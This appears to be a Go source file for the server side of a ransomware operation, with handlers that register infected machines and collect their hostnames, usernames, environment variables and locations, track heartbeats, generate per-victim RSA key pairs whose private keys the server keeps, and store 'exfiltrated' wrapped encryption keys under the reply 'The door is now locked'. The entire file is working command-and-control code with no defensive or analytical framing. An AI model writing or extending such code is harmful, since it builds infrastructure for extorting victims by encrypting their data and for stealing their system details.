package handlers

import (
	"context"
	"log"
	"net/http"
	"time"

	"github.com/gin-gonic/gin"
	"go.mongodb.org/mongo-driver/bson"
	"go.mongodb.org/mongo-driver/mongo"
	"go.mongodb.org/mongo-driver/mongo/options"
	
	"augus-server/internals/models"
	"augus-server/internals/utils"
	"augus-server/consts"
)



// Response messages
const (
	ErrorResponse    = "💀"
	HeartbeatMsg     = "The last man on Earth sat in the dark room and there was a knock on the door"
	RegistrationMsg  = "The owls are not what they seem"
	ExfiltrationMsg  = "The door is now locked"
)




// Handler functions
func HandlerRSAGeneration(appCtx context.Context, client *mongo.Client) gin.HandlerFunc {
	return func(gctx *gin.Context) {
		deviceID, valid := utils.ValidateDeviceID(gctx)
		if !valid {
			return
		}

		// Generate RSA key pair
		privateKey, err := utils.GenerateRSAKeyPair()
		if err != nil {
			log.Printf("[x] RSA generation failed: %v", err)
			gctx.JSON(http.StatusInternalServerError, gin.H{"error": ErrorResponse})
			return
		}

		// Get public key in PEM format
		publicKeyPEM, err := utils.MarshalPublicKeyToPEM(&privateKey.PublicKey)
		if err != nil {
			log.Printf("[x] Public key marshaling failed: %v", err)
			gctx.JSON(http.StatusInternalServerError, gin.H{"error": ErrorResponse})
			return
		}

		// Get private key in PEM format
		privateKeyPEM := utils.MarshalPrivateKeyToPEM(privateKey)

		ctx, cancel := utils.CreateTimeoutContext(appCtx, consts.TIMEOUT_CTX)
		defer cancel()

		devices := utils.GetDevicesCollection(client, consts.APP_NAME)
		update := bson.M{
			"$set": bson.M{
				"publicKey":     string(publicKeyPEM),
				"privateKey":    string(privateKeyPEM),
				"lastKeyUpdate": time.Now(),
			},
		}

		_, err = devices.UpdateOne(ctx, bson.M{"deviceId": deviceID}, update)
		if err != nil {
			log.Printf("[x] Database update failed: %v", err)
			gctx.JSON(http.StatusInternalServerError, gin.H{"error": ErrorResponse})
			return
		}

		gctx.Data(http.StatusOK, "application/x-pem-file", publicKeyPEM)
	}
}




func HandleHeartbeat(appCtx context.Context, client *mongo.Client) gin.HandlerFunc {
	return func(gctx *gin.Context) {
		deviceID, valid := utils.ValidateDeviceID(gctx)
		if !valid {
			return
		}

		var request models.HeartbeatRequest
		if err := gctx.ShouldBindJSON(&request); err != nil {
			gctx.JSON(http.StatusBadRequest, gin.H{"error": ErrorResponse})
			return
		}

		ctx, cancel := utils.CreateTimeoutContext(appCtx, consts.TIMEOUT_CTX)
		defer cancel()

		devices := utils.GetDevicesCollection(client, consts.APP_NAME)
		update := bson.M{
			"$set": bson.M{
				"lastSeen":     time.Now(),
				"geo":          request.Geo,
				"uptime":       request.Uptime,
				"memory":       request.Mem,
				"lastNonce":    request.Nonce,
				"lastUpdateAt": time.Now(),
			},
			"$inc": bson.M{
				"heartbeatCount": 1,
			},
		}

		_, err := devices.UpdateOne(ctx, bson.M{"deviceId": deviceID}, update)
		if err != nil {
			log.Printf("[x] Database update failed: %v", err)
			gctx.JSON(http.StatusInternalServerError, gin.H{"error": ErrorResponse})
			return
		}

		gctx.JSON(http.StatusOK, gin.H{"status": HeartbeatMsg})
	}
}

func HandleDeviceRegistration(appCtx context.Context, client *mongo.Client) gin.HandlerFunc {
	return func(gctx *gin.Context) {
		deviceID, valid := utils.ValidateDeviceID(gctx)
		if !valid {
			return
		}

		var request models.DeviceRegistrationRequest
		if err := gctx.ShouldBindJSON(&request); err != nil {
			gctx.JSON(http.StatusBadRequest, gin.H{"error": ErrorResponse})
			return
		}

		ctx, cancel := utils.CreateTimeoutContext(appCtx, consts.TIMEOUT_CTX)
		defer cancel()

		devices := utils.GetDevicesCollection(client, consts.APP_NAME)
		
		deviceDoc := bson.M{
			"deviceId":       deviceID,
			"persistentId":   request.PersistentID,
			"hostname":       request.Hostname,
			"username":       request.Username,
			"os":             request.OS,
			"architecture":   request.Architecture,
			"numCpu":         request.NumCPU,
			"goVersion":      request.GoVersion,
			"currentTime":    request.CurrentTime,
			"workingDir":     request.WorkingDir,
			"geo":            request.Geo,
			"envVars":        request.EnvVars,
			"wrappedAes":   	"",
			"publicKey":      "",
			"privateKey":     "",
			"lastSeen":       time.Now(),
			"registeredAt":   time.Now(),
			"online":         true,
		}

		update := bson.M{
			"$set": deviceDoc,
			"$setOnInsert": bson.M{
				"createdAt":      time.Now(),
				"heartbeatCount": 0,
			},
			"$inc": bson.M{
				"connectionCount": 1,
			},
		}

		opts := options.Update().SetUpsert(true)
		_, err := devices.UpdateOne(ctx, bson.M{"deviceId": deviceID}, update, opts)
		if err != nil {
			log.Printf("[x] Database update failed for device %s: %v", deviceID, err)
			gctx.JSON(http.StatusInternalServerError, gin.H{"error": ErrorResponse})
			return
		}

		response := gin.H{
			"status": RegistrationMsg,
			"config": gin.H{
				"heartbeat_interval": 300,
				"retry_policy": gin.H{
					"initial_delay":  10,
					"max_delay":     300,
					"backoff_factor": 2,
					"max_retries":    5,
				},
				"next_checkin": time.Now().Add(5 * time.Minute).Unix(),
			},
		}

		gctx.JSON(http.StatusOK, response)
	}
}

func HandleKeyExfiltration(appCtx context.Context, client *mongo.Client, dbName string, timeout time.Duration) gin.HandlerFunc {
	return func(gctx *gin.Context) {
		deviceID, valid := utils.ValidateDeviceID(gctx)
		if !valid {
			return
		}

		ctx, cancel := utils.CreateTimeoutContext(appCtx, timeout)
		defer cancel()

		// Check if device exists
		devices := utils.GetDevicesCollection(client, dbName)
		var existingDevice bson.M
		err := devices.FindOne(ctx, bson.M{"deviceId": deviceID}).Decode(&existingDevice)
		if err != nil {
			if err == mongo.ErrNoDocuments {
				gctx.JSON(http.StatusNotFound, gin.H{"error": "Device not registered"})
				return
			}
			log.Printf("[x] Database lookup failed for device %s: %v", deviceID, err)
			gctx.JSON(http.StatusInternalServerError, gin.H{"error": ErrorResponse})
			return
		}

		var request models.KeyExfiltrationRequest
		if err := gctx.ShouldBindJSON(&request); err != nil {
			gctx.JSON(http.StatusBadRequest, gin.H{"error": ErrorResponse})
			return
		}

		// Validate wrapped key
		wrappedKey, ok := request.Data["wrappedKey"].(string)
		if !ok || wrappedKey == "" {
			gctx.JSON(http.StatusBadRequest, gin.H{"error": ErrorResponse})
			return
		}

		// Store wrapped key
		keysCollection := client.Database(dbName).Collection("wrappedKeys")
		keyDoc := bson.M{
			"deviceId":      deviceID,
			"wrappedKey":    wrappedKey,
			"timestamp":     time.Now().UTC(),
			"clientVersion": gctx.GetHeader("X-Client-Version"),
			"requestType":   gctx.GetHeader("R-Type"),
			"receivedAt":    time.Now(),
			"associatedTo":  existingDevice["_id"],
		}

		_, err = keysCollection.InsertOne(ctx, keyDoc)
		if err != nil {
			log.Printf("[x] Failed to store wrapped key for device %s: %v", deviceID, err)
			gctx.JSON(http.StatusInternalServerError, gin.H{"error": ErrorResponse})
			return
		}

		// Update device last seen
		updateFilter := bson.M{"deviceId": deviceID}
		updateDoc := bson.M{"$set": bson.M{
			"lastSeen": time.Now(),
			"wrappedAes": wrappedKey,
			
		}}
		_, err = devices.UpdateOne(ctx, updateFilter, updateDoc)
		if err != nil {
			log.Printf("[x] Failed to update device timestamp %s: %v", deviceID, err)
			// Continue despite this error
		}

		gctx.JSON(http.StatusOK, gin.H{
			"status": ExfiltrationMsg,
			"next":   time.Now().Add(1 * time.Hour).Unix(),
		})
	}
}